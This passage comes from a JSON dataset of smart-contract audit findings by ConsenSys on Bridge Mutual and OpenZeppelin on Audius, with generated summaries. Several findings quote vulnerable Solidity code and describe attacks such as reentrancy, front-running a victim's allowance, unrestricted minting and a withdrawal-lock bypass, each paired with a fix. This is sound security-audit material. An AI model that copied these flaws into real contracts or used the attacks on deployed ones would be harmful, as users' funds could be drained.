        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13490",
      "title": "LiquidityMining can’t accept single ERC1155 tokens ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed by properly implementing the `ERC1155TokenReceiver`  interface.\n\n\n#### Description\n\n\nThe contract `LiquidityMining` is also defined as an `ERC1155Receiver`\n\n\n**code/contracts/LiquidityMining.sol:L19**\n\n\n\n```\ncontract LiquidityMining is ILiquidityMining, ERC1155Receiver, Ownable {\n\n```\nThe [finalized EIP-1155 standard](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1155.md) states that a contract which acts as an [EIP-1155 Receiver](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1155.md#erc-1155-token-receiver) must implement all the functions in the `ERC1155TokenReceiver` interface to be able to accept transfers.\n\n\nThese are indeed implemented here:\n\n\n**code/contracts/LiquidityMining.sol:L502**\n\n\n\n```\nfunction onERC1155Received(\n\n```\n**code/contracts/LiquidityMining.sol:L517**\n\n\n\n```\nfunction onERC1155BatchReceived(\n\n```\nThe standard states that they will be called and they MUST return a specific `byte4` value, otherwise the transfer will fail.\n\n\nHowever one of the methods returns an incorrect value. This seems to an error generated by a copy/paste action.\n\n\n**code/contracts/LiquidityMining.sol:L502-L515**\n\n\n\n```\nfunction onERC1155Received(\n    address operator,\n    address from,\n    uint256 id,\n    uint256 value,\n    bytes memory data\n)\n    external\n    pure\n    override\n    returns(bytes4)\n{\n    return bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"));\n}\n\n```\nThe value returned is equal to\n\n\n`bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"));`\n\n\nBut it should be\n\n\n`bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`.\n\n\nOn top of this, the contract MUST implement the ERC-165 standard to correctly respond to `supportsInterface`.\n\n\n#### Recommendation\n\n\nChange the return value of `onERC1155Received` to be equal to `0xf23a6e61` which represents `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`.\n\n\nAlso, make sure to implement `supportsInterface` to signify support of `ERC1155TokenReceiver` to accept transfers.\n\n\nAdd tests to check the functionality is correct and make sure these kinds of bugs do not exist in the future.\n\n\nMake sure to read the [EIP-1155](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1155.md) and [EIP-165](https://eips.ethereum.org/EIPS/eip-165) standards in detail and implement them correctly.",
      "summary": "\nThis bug report is about the contract `LiquidityMining` which is defined as an `ERC1155Receiver`. According to the finalized EIP-1155 standard, a contract which acts as an EIP-1155 Receiver must implement all the functions in the `ERC1155TokenReceiver` interface to be able to accept transfers. The contract must also implement the ERC-165 standard to correctly respond to `supportsInterface`. However, one of the methods returns an incorrect value. This is likely an error generated by a copy/paste action. The resolution to this bug is to change the return value of `onERC1155Received` to be equal to `0xf23a6e61` which represents `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`. Additionally, tests should be added to check the functionality is correct and make sure similar bugs do not exist in the future. It is important to read the EIP-1155 and EIP-165 standards in detail and implement them correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13489",
      "title": "The buyPolicyFor/addLiquidityFor should transfer funds from msg.sender ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed by removing the `buyPolicyFor` function. And the `addLiquidityFor` function can only be called by the `LiquidityMining` contract.\n\n\n#### Description\n\n\nWhen calling the `buyPolicyFor`/`addLiquidityFor` functions, are called with the parameter `_policyHolderAddr`/`_liquidityHolderAddr` who is going to be the beneficiary in buying policy/adding liquidity:\n\n\n**code/contracts/PolicyBook.sol:L183-L189**\n\n\n\n```\nfunction buyPolicyFor(\n  address \\_policyHolderAddr,\n  uint256 \\_epochsNumber,\n  uint256 \\_coverTokens   \n) external override {\n  \\_buyPolicyFor(\\_policyHolderAddr, \\_epochsNumber, \\_coverTokens);\n}\n\n```\n**code/contracts/PolicyBook.sol:L264-L266**\n\n\n\n```\nfunction addLiquidityFor(address \\_liquidityHolderAddr, uint256 \\_liquidityAmount) external override {\n  \\_addLiquidityFor(\\_liquidityHolderAddr, \\_liquidityAmount, false);\n}\n\n```\nDuring the execution, the funds for the policy/liquidity are transferred from the `_policyHolderAddr`/`_liquidityHolderAddr`, while it’s usually expected that they should be transferred from `msg.sender`. Because of that, anyone can call a function on behalf of a user that gave the allowance to the `PolicyBook`.\n\n\nFor example, a user(victim) wants to add some DAI to the liquidity pool and gives allowance to the `PolicyBook`. After that, the user should call `addLiquidity`, but the attacker can front-run this transaction and buy a policy on behalf of the victim instead.\n\n\nAlso, there is a curious edge case that makes this issue **`Critical`**: `_policyHolderAddr`/`_liquidityHolderAddr` parameters can be equal to the address of the `PolicyBook` contract. That may lead to multiple different dangerous attack vectors.\n\n\n#### Recommendation\n\n\nMake sure that nobody can transfer funds on behalf of the users if it’s not intended.",
      "summary": "\nA bug was discovered in the PolicyBook.sol contract which allows anyone to call a function on behalf of a user that has given allowance to the PolicyBook. This could allow an attacker to front-run a transaction and buy a policy on behalf of a victim. Additionally, the bug allows the user to set the _policyHolderAddr or _liquidityHolderAddr parameters to the address of the PolicyBook contract, which could lead to multiple different dangerous attack vectors. To address this issue, it is recommended that no one can transfer funds on behalf of the users unless it is intended. The `buyPolicyFor` function was removed, and the `addLiquidityFor` function was restricted so that it can only be called by the `LiquidityMining` contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13488",
      "title": "Re-entrancy issue for ERC1155 ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nAddressed by moving `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender.\n\n\n#### Description\n\n\nERC1155 tokens have callback functions on some of the transfers, like `safeTransferFrom`, `safeBatchTransferFrom`. During these transfers, the `IERC1155ReceiverUpgradeable(to).onERC1155Received` function is called in the `to` address.\n\n\nFor example, `safeTransferFrom` is used in the `LiquidityMining` contract:\n\n\n**code/contracts/LiquidityMining.sol:L204-L224**\n\n\n\n```\nfunction distributeAllNFT() external {\n    require(block.timestamp > getEndLMTime(),\n        \"2 weeks after liquidity mining time has not expired\");\n    require(!isNFTDistributed, \"NFT is already distributed\");\n\n    for (uint256 i = 0; i < leaderboard.length; i++) {\n        address[] memory \\_groupLeaders = groupsLeaders[leaderboard[i]];\n\n        for (uint256 j = 0; j < \\_groupLeaders.length; j++) {\n            \\_sendNFT(j, \\_groupLeaders[j]);\n        }\n    }\n\n    for (uint256 i = 0; i < topUsers.length; i++) {\n        address \\_currentAddress = topUsers[i];\n        LMNFT.safeTransferFrom(address(this), \\_currentAddress, 1, 1, \"\");\n        emit NFTSent(\\_currentAddress, 1);\n    }\n\n    isNFTDistributed = true;\n}\n\n```\nDuring that transfer, the `distributeAllNFT`  function can be called again and again. So multiple transfers will be done for each user.\n\n\nIn addition to that, any receiver of the tokens can revert the transfer. If that happens, nobody will be able to receive their tokens.\n\n\n#### Recommendation\n\n\n* Add a reentrancy guard.\n* Avoid transferring tokens for different receivers in a single transaction.",
      "summary": "\nThis bug report is about an issue with ERC1155 tokens and their callback functions. When `safeTransferFrom` is used in the `LiquidityMining` contract, multiple transfers are done for each user and any receiver of the tokens can revert the transfer. This results in nobody being able to receive their tokens. To resolve this issue, the code was changed to move the `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender. To prevent this issue from occurring in the future, it is recommended to add a reentrancy guard and to avoid transferring tokens for different receivers in a single transaction.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [
        "Reentrancy",
        "ERC1155"
      ],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13487",
      "title": "A liquidity provider can withdraw all his funds anytime ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThe funds are now locked when the withdrawal is requested, so funds cannot be transferred after the request, and this bug cannot be exploited anymore.\n\n\n#### Description\n\n\nSince some users provide liquidity to sell the insurance policies, it is important that these providers cannot withdraw their funds when the security breach happens and the policyholders are submitting claims. The liquidity providers can only request their funds first and withdraw them later (in a week).\n\n\n**code/contracts/PolicyBook.sol:L358-L382**\n\n\n\n```\nfunction requestWithdrawal(uint256 \\_tokensToWithdraw) external override {\n  WithdrawalStatus \\_status = getWithdrawalStatus(msg.sender);\n\n  require(\\_status == WithdrawalStatus.NONE || \\_status == WithdrawalStatus.EXPIRED,\n    \"PB: Can't request withdrawal\");\n\n  uint256 \\_daiTokensToWithdraw = \\_tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE\\_100);\n  uint256 \\_availableDaiBalance = balanceOf(msg.sender).mul(getDAIToDAIxRatio()).div(PERCENTAGE\\_100);\n\n  if (block.timestamp < liquidityMining.getEndLMTime().add(neededTimeAfterLM)) {\n    \\_availableDaiBalance = \\_availableDaiBalance.sub(liquidityFromLM[msg.sender]);\n  }\n\n  require(totalLiquidity >= totalCoverTokens.add(\\_daiTokensToWithdraw),\n    \"PB: Not enough liquidity\");\n\n  require(\\_availableDaiBalance >= \\_daiTokensToWithdraw, \"PB: Wrong announced amount\");\n\n  WithdrawalInfo memory \\_newWithdrawalInfo;\n  \\_newWithdrawalInfo.amount = \\_tokensToWithdraw;\n  \\_newWithdrawalInfo.readyToWithdrawDate = block.timestamp.add(withdrawalPeriod);\n\n  withdrawalsInfo[msg.sender] = \\_newWithdrawalInfo;\n  emit RequestWithdraw(msg.sender, \\_tokensToWithdraw, \\_newWithdrawalInfo.readyToWithdrawDate);\n}\n\n```\n**code/contracts/PolicyBook.sol:L384-L396**\n\n\n\n```\nfunction withdrawLiquidity() external override {\n  require(getWithdrawalStatus(msg.sender) == WithdrawalStatus.READY,\n    \"PB: Withdrawal is not ready\");\n\n  uint256 \\_tokensToWithdraw = withdrawalsInfo[msg.sender].amount;\n  uint256 \\_daiTokensToWithdraw = \\_tokensToWithdraw.mul(getDAIToDAIxRatio()).div(PERCENTAGE\\_100);\n\n  if (withdrawalQueue.length != 0 || totalLiquidity.sub(\\_daiTokensToWithdraw) < totalCoverTokens) {\n    withdrawalQueue.push(msg.sender);\n  } else {\n    \\_withdrawLiquidity(msg.sender, \\_tokensToWithdraw);\n  }\n}\n\n```\nThere is a restriction in `requestWithdrawal` that requires the liquidity provider to have enough funds at the moment of request:\n\n\n**code/contracts/PolicyBook.sol:L371-L374**\n\n\n\n```\nrequire(totalLiquidity >= totalCoverTokens.add(\\_daiTokensToWithdraw),\n  \"PB: Not enough liquidity\");\n\nrequire(\\_availableDaiBalance >= \\_daiTokensToWithdraw, \"PB: Wrong announced amount\");\n\n```\nBut after the request is created, these funds can then be transferred to another address. When the request is created, the provider should wait for 7 days, and then there will be 2 days to withdraw the requested amount:\n\n\n**code/contracts/PolicyBook.sol:L113-L114**\n\n\n\n```\nwithdrawalPeriod = 1 weeks;\nwithdrawalExpirePeriod = 2 days;\n\n```\nThe attacker would have 4 addresses that will send the pool tokens to each other and request withdrawal of the full amount one by one every 2 days. So at least one of the addresses can withdraw all of the funds at any point in time. If the liquidity provider needs to withdraw funds immediately, he should transfer all funds to that address and execute the withdrawal.\n\n\n#### Recommendation\n\n\nOne of the solutions would be to block the DAIx tokens from being transferred after the withdrawal request.",
      "summary": "\nThis bug report is about an exploit that allows liquidity providers to withdraw funds from a pool even if the total liquidity is not enough to cover the amount requested. The exploit occurs when the liquidity provider requests a withdrawal, but before they can withdraw it, they transfer the funds to another address. This means that at least one of the addresses can withdraw all of the funds at any point in time.\n\nThe resolution to this bug is that the funds are now locked when the withdrawal is requested, so funds cannot be transferred after the request, and this bug cannot be exploited anymore.\n\nThe recommendation is to block the DAIx tokens from being transferred after the withdrawal request. This will ensure that the liquidity provider cannot transfer their funds to another address and exploit the bug. It will also ensure that the total liquidity is enough to cover the amount requested.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13486",
      "title": "Profit and loss distribution mechanism is not working ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed by updating the `totalLiquidity` during claims and premium distribution.\n\n\n#### Description\n\n\nLiquidity providers should deposit DAI and receive DAIx in return; the initial rate of DAI to DAIx is 1. If claims are happening, the price of DAIx should decrease, and the loss should be distributed proportionally across the liquidity providers. If the policy is bought, the DAIx price should increase. Currently, it seems like the `getDAIToDAIxRatio` will always be zero because it’s based on the `totalLiquidity` to the `totalSupply()` ratio. While the `totalSupply()` remains correct, the `totalLiquidity` is only modified when adding/removing liquidity. The `totalLiquidity` should represent the amount of DAI in the smart contract, which is the added liquidity + premium - claims. But the claims and premiums are not changing the `totalLiquidity` value.\n\n\nThat error may also lead to the deficit of funds during withdrawals or claims.\n\n\n#### Recommendation\n\n\nProperly keep track of the `totalLiquidity`.",
      "summary": "\nThis bug report is about an issue with the liquidity providers of a smart contract. When liquidity providers deposit DAI and receive DAIx in return, the initial rate of DAI to DAIx is 1. However, when claims are happening, the price of DAIx should decrease, and the loss should be distributed proportionally across the liquidity providers. If the policy is bought, the DAIx price should increase.\n\nThe bug is that the `totalLiquidity` is not being updated when claims and premiums are happening, meaning that the `getDAIToDAIxRatio` will always be zero. This could result in a deficit of funds during withdrawals or claims.\n\nThe recommendation is to properly keep track of the `totalLiquidity`. The solution is to update the `totalLiquidity` during claims and premium distribution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13485",
      "title": "Liquidity providers can create deficit of DAI tokens ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed by keeping all the DAI inside the PolicyBook.\n\n\n#### Description\n\n\nThe current staking system is built in a way that a liquidity provider can stake DAIx tokens to the staking contract. By doing so, DAI tokens are getting withdrawn from the PolicyBook and there may be not enough funds to fulfill claims.\n\n\n#### Recommendation\n\n\nThis issue requires major changes in the logic of the system.",
      "summary": "\nThis bug report is about an issue with the current staking system. When a liquidity provider stakes DAIx tokens to the staking contract, DAI tokens are withdrawn from the PolicyBook, potentially leaving not enough funds to fulfill claims. This issue requires major changes in the logic of the system, and the bug was fixed by keeping all the DAI inside the PolicyBook.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "13484",
      "title": "Anyone is able to mint NFTs by calling mintNFTsForLM ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed. Not an issue, as the contract is meant to be used as a mock.\n\n\n#### Description\n\n\nThe contract `LiquidityMiningNFT` has the method `mintNFTsForLM`.\n\n\n**code/contracts/LiquidityMiningNFT.sol:L12-L29**\n\n\n\n```\nfunction mintNFTsForLM(address \\_liquidiyMiningAddr) external {\n    uint256[] memory \\_ids = new uint256[](NFT\\_TYPES\\_COUNT);\n    uint256[] memory \\_amounts = new uint256[](NFT\\_TYPES\\_COUNT);\n\n    \\_ids[0] = 1;\n    \\_amounts[0] = 5;\n\n    \\_ids[1] = 2;\n    \\_amounts[1] = 1 \\* LEADERBOARD\\_SIZE;\n\n    \\_ids[2] = 3;\n    \\_amounts[2] = 3 \\* LEADERBOARD\\_SIZE;\n\n    \\_ids[3] = 4;\n    \\_amounts[3] = 6 \\* LEADERBOARD\\_SIZE;\n\n    \\_mintBatch(\\_liquidiyMiningAddr, \\_ids, \\_amounts, \"\");\n}\n\n```\nHowever, this contract does not have any kind of special permissions to limit who is able to mint tokens.\n\n\nAn attacker could call `LiquidityMiningNFT.mintNFTsForLM(0xhackerAddress)` to mint tokens for their address and sell them on the marketplace. They are also allowed to mint as many tokens as they want by calling the method multiple times.\n\n\n#### Recommendation\n\n\nAdd some permissions to limit only some actors to mint tokens.",
      "summary": "\nThe contract 'LiquidityMiningNFT' has a method 'mintNFTsForLM' which allows anyone to mint tokens for their address and sell them on the marketplace. There are no special permissions to limit who is able to mint tokens, meaning an attacker can call the method multiple times to mint as many tokens as they want. To solve this issue, it is recommended to add some permissions to limit only some actors to mint tokens. The bug was fixed, as the contract is meant to be used as a mock.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Bridge Mutual",
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Daniel Luca",
        "Sergii Kravchenko"
      ]
    },
    {
      "id": "11341",
      "title": "[L08] Votes can be overwritten by calling the same function for the first vote",
      "impact": "LOW",
      "content": "In order to vote in a proposal, stakers call the [`submitProposalVote` of the `Governance` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L223). If they want to update their vote, they [call the same function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L263).\n\n\nThis is giving two different responsibilities to the same function, which makes the code for the function more complicated than it should. It could also lead to mistakes by careless callers that might not notice they are updating their vote.\n\n\nConsider splitting this function in two, to add a new `updateVote` function that takes care of updating an existing vote.\n\n\n***Update:** Fixed in [pull request #596](https://github.com/AudiusProject/audius-protocol/pull/596).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11340",
      "title": "[L07] Outdated Solidity version in use",
      "impact": "LOW",
      "content": "An outdated Solidity version, [0.5.16](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/truffle-config.js#L34), is currently in use. As Solidity is now under a fast release cycle, ensure that the latest version of the compiler is used at the time of deployment (presently 0.5.17 in the 0.5.x branch).\n\n\nSince OpenZeppelin version 3.0.0, the 0.6.x branch of Solidity is supported. Consider updating both OpenZeppelin and Solidity to their latest stable branches.\n\n\n***Update:** Fixed in [PR#602](https://github.com/AudiusProject/audius-protocol/pull/602). The project is now using the latest Solidity release from the 0.5 branch. Consider updating the `pragma` statement on all contracts to require this latest version or a newer one.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11339",
      "title": "[L06] Misleading comments, docstrings, and typographical errors",
      "impact": "LOW",
      "content": "Some docstrings and inline comments were found to be erroneous. In particular:\n\n\n* [Line 412 of `ServiceProviderFactory.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L412) says “Must have called requestDecreaseStake and waited for the lockup period to expire”, but it is possible that the `DecreaseStakeRequest` was queued up by the [`deregister` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L224) instead of the [`requestDecreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364).\n* [Line 486 of `ServiceProviderFactory.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L486) says that the third parameter is `_oldEndpoint` but it is actually `_newEndpoint`.\n* [Line 123 of `Staking.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Staking.sol#L123) says `historry` but it should say `history`.\n* [Line 231 of `Staking.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Staking.sol#L231) has an incorrect `@notice` tag for the `undelegateStakeFor` function (it duplicates the one for the [`delegateStakeFor` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Staking.sol#L209-L212)).\n\n\nConsider fixing these errors before deploying the contracts.\n\n\n***Update:** Fixed in [pull requests #546](https://github.com/AudiusProject/audius-protocol/pull/546) and [#672](https://github.com/AudiusProject/audius-protocol/pull/672/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11338",
      "title": "[L05] Contracts have artifacts leftover from earlier test versions",
      "impact": "LOW",
      "content": "The whitepaper defines the native token’s symbol as “AUDS” and its name as “Audius”. However, the symbol used in [the `AudiusToken` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/erc20/AudiusToken.sol#L21) is “TAUDS” and its name is “TestAudius”.\n\n\nIn [the `ServiceTypeManager` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L34-L35) there are two events called `Test` and `TestAddr` that are not used in the code.\n\n\nConsider changing the name and symbol to the ones defined in the whitepaper, and consider removing the unused test events.\n\n\n***Update:** Partially fixed. The test events were deleted in [pull request #583](https://github.com/AudiusProject/audius-protocol/pull/583/files#diff-97eaf3b56cab95094247b87ff242d988L35-L36). Audius’ statement for the token issue:*\n\n\n\n> This was done on purpose so we wouldn’t accidentally deploy test contracts to mainnet with the token symbol AUDS. The plan was to change the name and symbol before the final deploy of the contracts as to not pollute the ERC-20 landscape with the token name and symbol.\n> \n> \n\n\n***Update:** Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11337",
      "title": "[L04] Lack of indexed parameters in events",
      "impact": "LOW",
      "content": "Some events are defined with no indexed parameters. For example, [`ClaimProcessed` in the `ClaimsManager` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L66) and [`RegisteredServiceProvider` in the `ServiceProviderFactory` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L87).\n\n\nConsider [indexing event parameters](https://solidity.readthedocs.io/en/latest/contracts.html#events) to avoid hindering the task of off-chain services searching and filtering for specific events.\n\n\n***Update**: Partially fixed in [pull request #614](https://github.com/AudiusProject/audius-protocol/pull/614/files). Some [important events](https://github.com/AudiusProject/audius-protocol/blob/mainnet-audit-feedback/eth-contracts/contracts/DelegateManager.sol#L70-L92) still lack of indexed parameters.*\n\n\n***Update**: Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11336",
      "title": "[L03] Duplicated staker check",
      "impact": "LOW",
      "content": "In lines [236](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L236) and [340](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L340) of `Governance.sol`, the same check for active stake at a particular block number is executed.\n\n\nTo avoid duplication, and to improve encapsulation and readability, consider implementing a function `wasStakerAt` in the [`Staking` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Staking.sol#L13), and calling this function in the `Governance` contract instead of reimplementing the check.\n\n\nIn the same `Governance` contract, there is another [check to see if the account currently has some stake](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L169). For readability and consistency with the previous suggestion, consider also adding a function `isCurrentStaker` the [`Staking` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Staking.sol#L13).\n\n\n***Update**: Partially fixed in [pull request #580](https://github.com/AudiusProject/audius-protocol/pull/580). The `isStaker` function was introduced to the `Staking` contract. The check for active stake at a block number was not refactored. Audius’ statement for this issue:*\n\n\n\n> After evaluation, the suggested function `wasStakerAt` may offer a slight improvement in readability but sacrifice other benefits. For example, if `wasStakerAt` is a function returning a `bool` for a specific block:\n> \n> \n> `wasStakerAt(spAddress, blockId) returns (bool)`\n> \n> \n> In order to replace current usage of `totalStakedForAt` per audit feedback, another call would have to be made to retrieve the stake at a given block – this is a strictly worse outcome despite marginal improvement in readability.\n> \n> \n> Alternatively, if `wasStakerAt` is a function returning `(uint, bool)` tuple indicating stakedAmount at a given block:\n> \n> \n> `wasStakerAt(spAddress, blockNum) returns (uint, bool)`\n> \n> \n> The above pattern is returning a boolean that can be trivially generated by evaluating the stake at a given `block > 0`, which is identical to our current use of `totalStakedForAt > 0`.\n> \n> \n> Finally, there is an option to create a function that returns `(uint)` the stake at a current block but also does additional validation in the form of require statements:\n> \n> \n> `wasStakerAt(spAddress, blockNum) returns (uint):  \n> \n> require(valueAtBlock > 0)  \n> \n> ...  \n> \n> return valueAtBlock`\n> \n> \n> However, we felt that this solution actually ends up less readable since the function `wasStakerAt` implies a returned boolean value but instead reverts on failure.\n> \n> \n> For the above reasons, we have decided to forgo implementing the suggested wasStakerAt helper function in favor of our existing > 0 check for value at a specific block.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11335",
      "title": "[L02] Duplicated newProposalId calculation",
      "impact": "LOW",
      "content": "In lines [187](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L187) and [213](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L213) of `Governance.sol`, the same addition is executed twice.\n\n\nTo avoid duplication, consider replacing the second calculation with the value of `newProposalId`.\n\n\n***Update:** Fixed in [pull request #544](https://github.com/AudiusProject/audius-protocol/pull/544/).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11334",
      "title": "[L01] Governance proposal description only stored in log",
      "impact": "LOW",
